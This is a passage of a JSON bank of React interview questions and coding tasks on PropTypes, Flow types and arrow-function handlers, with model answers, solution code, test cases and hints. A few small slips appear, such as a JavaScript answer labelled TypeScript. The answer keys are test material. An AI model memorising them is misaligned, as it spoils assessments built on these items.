          "answer": "```typescript\nimport React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction ProductCard({ name, price, isInStock, tags }) {\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px' }}>\n      <h3>{name}</h3>\n      <p>Price: ${price.toFixed(2)}</p>\n      <p>Status: {isInStock ? 'In Stock' : 'Out of Stock'}</p>\n      {tags.length > 0 && (\n        <p>Tags: {tags.join(', ')}</p>\n      )}\n    </div>\n  );\n}\n\nProductCard.propTypes = {\n  name: PropTypes.string.isRequired,\n  price: PropTypes.number.isRequired,\n  isInStock: PropTypes.bool,\n  tags: PropTypes.arrayOf(PropTypes.string),\n};\n\nProductCard.defaultProps = {\n  isInStock: true,\n  tags: [],\n};\n\n// Example Usage:\n// <ProductCard name=\"Laptop\" price={1200.50} />\n// <ProductCard name=\"Mouse\" price={25} isInStock={false} tags={['gaming', 'wireless']} />\n```",
          "options": [],
          "analysisPoints": [
            "Correct use of `PropTypes.string`, `PropTypes.number`, `PropTypes.bool`, `PropTypes.arrayOf(PropTypes.string)`.",
            "Correct application of `.isRequired`.",
            "Proper definition of `defaultProps` for optional values.",
            "Functional component structure and prop destructuring."
          ],
          "keyConcepts": [
            "PropTypes",
            "defaultProps",
            "Functional Components",
            "Prop Validation"
          ],
          "evaluationCriteria": [
            "Ability to define PropTypes for various data types.",
            "Correctly implementing default props.",
            "Adherence to React component best practices."
          ],
          "example": "",
          "tags": [
            "React",
            "PropTypes",
            "Coding Challenge",
            "Component Design"
          ],
          "prerequisites": [
            "React_functional_components",
            "PropTypes_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_flow_comparison_5",
          "topic": "Flow vs. PropTypes Scenarios",
          "level": "hard",
          "type": "open",
          "question": "In a large-scale React application where teams are adopting type checking, discuss a scenario where Flow would be significantly more beneficial than PropTypes, and conversely, a scenario where PropTypes might still offer value even if Flow is also used.",
          "answer": "**Scenario where Flow is significantly more beneficial:**\n\n*   **Complex Application Logic & Inter-Module Communication**: In a large application with many interconnected modules, services, and data flows (e.g., Redux stores, API clients, utility functions), Flow's static analysis across the entire codebase is invaluable. It can ensure type consistency for data structures passed between different layers (e.g., from an API response parser to a Redux action creator, then to a reducer, and finally to a component's props). PropTypes only validates props at the component boundary; it cannot check the types of arguments passed to a utility function or the return type of a selector. Flow catches errors before runtime, providing faster feedback and preventing entire classes of bugs (e.g., `undefined` property access, incorrect argument types in deeply nested calls) that PropTypes simply cannot detect.\n\n**Scenario where PropTypes might still offer value even if Flow is also used:**\n\n*   **Public Component Libraries/SDKs**: If you are developing a React component library or SDK that will be consumed by external developers who might not be using Flow (or any static type checker), PropTypes can still provide valuable runtime warnings. While Flow ensures type safety within your library's development, PropTypes can act as a user-friendly guardrail for consumers. If a consumer passes an incorrectly typed prop, PropTypes will log a helpful console warning, guiding them to fix their usage without requiring them to set up or understand your library's internal type system. This enhances the developer experience for consumers of your library.",
          "options": [],
          "analysisPoints": [
            "Understanding the scope of static vs. runtime checks.",
            "Recognizing the limitations of PropTypes for deep logic.",
            "Identifying practical scenarios for each tool's strength.",
            "Considering developer experience for library consumers."
          ],
          "keyConcepts": [
            "Static Type Checking",
            "Runtime Type Checking",
            "Flow",
            "PropTypes",
            "Large Applications",
            "Component Libraries",
            "Developer Experience"
          ],
          "evaluationCriteria": [
            "Ability to analyze real-world scenarios.",
            "Deep understanding of type checking tool strengths and weaknesses.",
            "Critical thinking about development best practices."
          ],
          "example": "",
          "tags": [
            "Flow",
            "PropTypes",
            "Architecture",
            "Best Practices",
            "Type Checking",
            "Advanced"
          ],
          "prerequisites": [
            "Flow",
            "PropTypes"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "expert"
        }
      ],
      "tasks": [
        {
          "id": "task_arrow_functions_this_binding_1",
          "title": "Build a Controlled Input with Arrow Function Handler",
          "description": "\nCreate a React class component named `TextReverser` that renders a text input and a paragraph displaying the reversed value of the input. The input should be a controlled component.\n\nRequirements:\n1.  Initialize the component's state with an empty string for the input value.\n2.  Use a class property arrow function for the `onChange` event handler of the input field.\n3.  The handler should update the component's state with the current input value.\n4.  The paragraph element should always display the *reversed* string from the state.\n5.  Ensure `this` context is correctly maintained without explicit binding in the constructor.\n",
          "difficulty": "medium",
          "startingCode": "import React, { Component } from 'react';\n\nclass TextReverser extends Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      inputValue: ''\n    };\n  }\n\n  // TODO: Implement the onChange handler as a class property arrow function\n  // onChangeHandler = (e) => { /* ... */ };\n\n  // TODO: Implement a helper function to reverse the string\n  // reverseString = (str) => { /* ... */ };\n\n  render() {\n    const { inputValue } = this.state;\n    // const reversedValue = this.reverseString(inputValue); // Use your helper here\n    const reversedValue = inputValue.split('').reverse().join('');\n\n    return (\n      <div>\n        <h2>Text Reverser</h2>\n        <input\n          type=\"text\"\n          value={inputValue}\n          // onChange={this.onChangeHandler} // Link your handler here\n        />\n        <p>Reversed Text: {reversedValue}</p>\n      </div>\n    );\n  }\n}\n\nexport default TextReverser;\n",
          "solutionCode": "import React, { Component } from 'react';\n\nclass TextReverser extends Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      inputValue: ''\n    };\n  }\n\n  // Implemented as a class property arrow function to auto-bind 'this'\n  onChangeHandler = (e) => {\n    this.setState({\n      inputValue: e.target.value\n    });\n  };\n\n  // Helper function to reverse the string (optional, can be inline in render)\n  reverseString = (str) => {\n    return str.split('').reverse().join('');\n  };\n\n  render() {\n    const { inputValue } = this.state;\n    const reversedValue = this.reverseString(inputValue); // Using the helper\n\n    return (\n      <div>\n        <h2>Text Reverser</h2>\n        <input\n          type=\"text\"\n          value={inputValue}\n          onChange={this.onChangeHandler}\n          placeholder=\"Type something...\"\n        />\n        <p>Original Text: {inputValue}</p>\n        <p>Reversed Text: {reversedValue}</p>\n      </div>\n    );\n  }\n}\n\nexport default TextReverser;\n",
          "testCases": [
            "Typing 'hello' should display 'olleh'.",
            "Typing an empty string '' should display an empty string.",
            "Typing 'React' should display 'tcaeR'.",
            "The input field should reflect the typed text correctly (controlled component behavior)."
          ],
          "hints": [
            "Remember that arrow functions as class properties inherently handle `this` binding.",
            "You'll need `e.target.value` to get the input's current value.",
            "String reversal can be done efficiently with `split('').reverse().join('')`."
          ],
          "tags": [
            "React",
            "Class Components",
            "State Management",
            "Event Handling",
            "Arrow Functions",
            "Controlled Components"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "React_class_components",
            "React_state",
            "JavaScript_this_keyword",
            "ES6_arrow_functions"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "controlled_components",
            "this_binding"
          ]
        },
        {
          "id": "task_prop_types_validation_1",
          "title": "Implement User Card with Comprehensive PropTypes Validation",
          "description": "\nCreate a React functional component named `UserCard` that displays detailed user information. The component should enforce strict prop validation using `prop-types` and provide sensible `defaultProps`.\n\nRequirements:\n1.  **Props Definition**:\n    *   `id`: `number`, required. (Unique user ID)\n    *   `name`: `string`, required. (User's full name)\n    *   `email`: `string`, required. (User's email address)\n    *   `age`: `number`, optional. Default to `30`.\n    *   `isActive`: `boolean`, optional. Default to `true`.\n    *   `roles`: `arrayOf(string)`, optional. Default to `['User']`.\n    *   `address`: `shape({ street: string, city: string, zip: string })`, optional. All sub-properties are required within the shape if `address` is provided.\n    *   `onDelete`: `func`, required. (Callback function for a delete button)\n    *   `statusMessage`: A custom prop `string` that must be either 'Online' or 'Offline'. If provided, it must be one of these values.\n\n2.  **Component Rendering**:\n    *   Display `name`, `email`, `age`, `isActive` status.\n    *   List `roles` (if any).\n    *   Display `address` details (if provided).\n    *   Include a 'Delete' button that calls `onDelete`.\n    *   Display `statusMessage`.\n\n3.  **PropType Configuration**:\n    *   Apply `isRequired` where appropriate.\n    *   Use `PropTypes.arrayOf`, `PropTypes.shape`, and `PropTypes.func`.\n    *   Implement a `PropTypes.oneOf` for `statusMessage`.\n    *   Implement `defaultProps` for `age`, `isActive`, and `roles`.\n\nYour solution should demonstrate a thorough understanding of `prop-types` capabilities.\n",
          "difficulty": "hard",
          "startingCode": "import React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction UserCard(props) {\n  const { id, name, email, age, isActive, roles, address, onDelete, statusMessage } = props;\n\n  return (\n    <div style={{ border: '1px solid #eee', padding: '15px', margin: '10px', borderRadius: '5px' }}>\n      <h3>{name} (ID: {id})</h3>\n      <p>Email: {email}</p>\n      <p>Age: {age}</p>\n      <p>Status: {isActive ? 'Active' : 'Inactive'}</p>\n      {roles.length > 0 && (\n        <p>Roles: {roles.join(', ')}</p>\n      )}\n      {address && (\n        <p>\n          Address: {address.street}, {address.city}, {address.zip}\n        </p>\n      )}\n      {statusMessage && <p>Connection: {statusMessage}</p>}\n      <button onClick={onDelete}>Delete User</button>\n    </div>\n  );\n}\n\nUserCard.propTypes = {\n  // TODO: Define all propTypes here\n};\n\nUserCard.defaultProps = {\n  // TODO: Define all defaultProps here\n};\n\nexport default UserCard;\n",
          "solutionCode": "import React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction UserCard(props) {\n  const { id, name, email, age, isActive, roles, address, onDelete, statusMessage } = props;\n\n  return (\n    <div style={{ border: '1px solid #eee', padding: '15px', margin: '10px', borderRadius: '5px' }}>\n      <h3>{name} (ID: {id})</h3>\n      <p>Email: {email}</p>\n      <p>Age: {age}</p>\n      <p>Status: {isActive ? 'Active' : 'Inactive'}</p>\n      {roles.length > 0 && (\n        <p>Roles: {roles.join(', ')}</p>\n      )}\n      {address && (\n        <p>\n          Address: {address.street}, {address.city}, {address.zip}\n        </p>\n      )}\n      {statusMessage && <p>Connection: {statusMessage}</p>}\n      <button onClick={onDelete}>Delete User</button>\n    </div>\n  );\n}\n\nUserCard.propTypes = {\n  id: PropTypes.number.isRequired,\n  name: PropTypes.string.isRequired,\n  email: PropTypes.string.isRequired,\n  age: PropTypes.number,\n  isActive: PropTypes.bool,\n  roles: PropTypes.arrayOf(PropTypes.string),\n  address: PropTypes.shape({\n    street: PropTypes.string.isRequired,\n    city: PropTypes.string.isRequired,\n    zip: PropTypes.string.isRequired,\n  }),\n  onDelete: PropTypes.func.isRequired,\n  statusMessage: PropTypes.oneOf(['Online', 'Offline']),\n};\n\nUserCard.defaultProps = {\n  age: 30,\n  isActive: true,\n  roles: ['User'],\n};\n\nexport default UserCard;\n",
          "testCases": [
            "Render with all required props and default values: ` <UserCard id={1} name=\"Alice\" email=\"alice@example.com\" onDelete={() => console.log('Delete Alice')} />` (Should show default age, isActive, roles).",
            "Render with all props explicitly provided: ` <UserCard id={2} name=\"Bob\" email=\"bob@example.com\" age={25} isActive={false} roles={['Admin', 'Editor']} address={{ street: '123 Main St', city: 'Anytown', zip: '12345' }} onDelete={() => {}} statusMessage=\"Online\" />`",
            "Test `statusMessage` invalid value: ` <UserCard id={3} name=\"Charlie\" email=\"charlie@example.com\" onDelete={() => {}} statusMessage=\"Away\" />` (Should produce a PropTypes warning).",
            "Test missing required prop: ` <UserCard id={4} email=\"missingname@example.com\" onDelete={() => {}} />` (Should produce a PropTypes warning for `name`).",
            "Test invalid type for a prop: ` <UserCard id={5} name={123} email=\"invalid@example.com\" onDelete={() => {}} />` (Should produce a PropTypes warning for `name`)."
          ],
          "hints": [
            "Remember that `defaultProps` are applied *before* `propTypes` validation.",
            "For the `address` shape, each nested property (`street`, `city`, `zip`) still needs its own `isRequired` if it's mandatory within the shape.",
            "`PropTypes.oneOf` is perfect for props that must be one of a limited set of literal values.",
            "Don't forget to destructure `props` in the functional component for cleaner access."
          ],
          "tags": [
            "React",
            "PropTypes",
            "Component Design",
            "Validation",
            "Best Practices"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "React_functional_components",
            "PropTypes_basics",
            "PropTypes_advanced_validators"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "prop_validation",
            "default_props"
          ]
        },
        {
          "id": "task_flow_integration_1",
          "title": "Convert a React Component to Use Flow Types",
          "description": "\nTake the provided `PostDisplay` React functional component (currently without explicit types) and integrate Flow for static type checking. Define appropriate type aliases for its props and any nested objects.\n\nRequirements:\n1.  Enable Flow for the file.\n2.  Define a Flow `type` alias for `Comment` with `id: number` and `text: string`.\n3.  Define a Flow `type` alias for `PostProps` that includes:\n    *   `title: string` (required)\n    *   `content: string` (required)\n    *   `author: string` (required)\n    *   `likes: number` (optional, defaults to `0` if not passed)\n    *   `comments: Array<Comment>` (optional, defaults to an empty array)\n    *   `onLike: () => void` (required, a function that takes no arguments and returns nothing)\n4.  Apply `PostProps` to the `PostDisplay` component's parameters.\n5.  Ensure the component can still render correctly with both provided and default values.\n\nNOTE: While Flow *does not* have a direct equivalent to `defaultProps` in its type system, you should still define `likes` and `comments` as optional (`?`) in the type alias to reflect that they might not be passed, and then ensure your component handles their absence gracefully (e.g., providing fallback values or conditional rendering). For the purpose of this task, assume `defaultProps` will be handled separately in the React component as shown in the example.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\n// TODO: Add // @flow directive here\n\n// TODO: Define Comment type alias\n// type Comment = { /* ... */ };\n\n// TODO: Define PostProps type alias\n// type PostProps = { /* ... */ };\n\nfunction PostDisplay(props /* TODO: Add type annotation here */) {\n  const { title, content, author, likes, comments, onLike } = props;\n\n  // Handle default values for optional props within the component if needed\n  const actualLikes = likes === undefined ? 0 : likes;\n  const actualComments = comments === undefined ? [] : comments;\n\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '20px', margin: '15px', borderRadius: '8px' }}>\n      <h2>{title}</h2>\n      <p><em>By {author}</em></p>\n      <p>{content}</p>\n      <p>Likes: {actualLikes}</p>\n      <button onClick={onLike}>Like Post</button>\n      <h4>Comments:</h4>\n      {actualComments.length > 0 ? (\n        <ul>\n          {actualComments.map(comment => (\n            <li key={comment.id}>{comment.text}</li>\n          ))}\n        </ul>\n      ) : (\n        <p>No comments yet.</p>\n      )}\n    </div>\n  );\n}\n\n// Optional: You can still use React's defaultProps for runtime defaults\n// PostDisplay.defaultProps = {\n//   likes: 0,\n//   comments: [],\n// };\n\nexport default PostDisplay;\n",
          "solutionCode": "// @flow\nimport * as React from 'react';\n\ntype Comment = {\n  id: number,\n  text: string,\n};\n\ntype PostProps = {\n  title: string,\n  content: string,\n  author: string,\n  likes?: number,\n  comments?: Array<Comment>,\n  onLike: () => void,\n};\n\nfunction PostDisplay(props: PostProps) {\n  const { title, content, author, likes, comments, onLike } = props;\n\n  // Using optional chaining and nullish coalescing for graceful handling of optional props\n  const actualLikes = likes ?? 0; // If likes is undefined or null, use 0\n  const actualComments = comments ?? []; // If comments is undefined or null, use empty array\n\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '20px', margin: '15px', borderRadius: '8px' }}>\n      <h2>{title}</h2>\n      <p><em>By {author}</em></p>\n      <p>{content}</p>\n      <p>Likes: {actualLikes}</p>\n      <button onClick={onLike}>Like Post</button>\n      <h4>Comments:</h4>\n      {actualComments.length > 0 ? (\n        <ul>\n          {actualComments.map(comment => (\n            <li key={comment.id}>{comment.text}</li>\n          ))}\n        </ul>\n      ) : (\n        <p>No comments yet.</p>\n      )}\n    </div>\n  );\n}\n\n// It's still common practice to define defaultProps for runtime behavior,\n// even with static type checkers. The type definition ensures consistency.\nPostDisplay.defaultProps = {\n  likes: 0,\n  comments: [],\n};\n\nexport default PostDisplay;\n",
          "testCases": [
            "Verify Flow is enabled: Removing `// @flow` should make Flow stop checking. Re-adding it should make it active.",
            "Test basic rendering with all required props: ` <PostDisplay title=\"My First Post\" content=\"This is the content.\" author=\"John Doe\" onLike={() => console.log('Liked!')} />` (Should show 0 likes and 'No comments yet').",
            "Test with optional props provided: ` <PostDisplay title=\"Another Post\" content=\"More content here.\" author=\"Jane Smith\" likes={15} comments={[{ id: 1, text: 'Great post!' }]} onLike={() => console.log('Liked!')} />` (Should show 15 likes and the comment).",
            "Test incorrect type for a prop (e.g., `likes: 'five'`): Flow should report a type error.",
            "Test missing required prop (e.g., `onLike`): Flow should report a type error.",
            "Test passing a comment without an `id` or `text` (if `Comment` type is strictly enforced): Flow should report a type error."
          ],
          "hints": [
            "Start with the `// @flow` directive at the very top.",
            "Use the `type` keyword to define your aliases.",
            "Remember the `?` suffix for optional properties in Flow types.",
            "Function types in Flow follow the `(arg1: Type, arg2: Type) => ReturnType` syntax; for no arguments and no return, use `() => void`.",
            "Apply the `PostProps` type directly to the `props` parameter: `function PostDisplay(props: PostProps)`."
          ],
          "tags": [
            "React",
            "Flow",
            "Type Checking",
            "Static Analysis",
            "Component Design",
            "Type Aliases"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "React_functional_components",
            "Flow_basics",
            "JavaScript_destructuring"
          ],
          "complexity": 7,
          "interviewRelevance": 6,
          "learningPath": "advanced",
          "relatedConcepts": [
            "static_type_checking",
            "type_definitions"
          ]
        }
      ]
    }
  }
]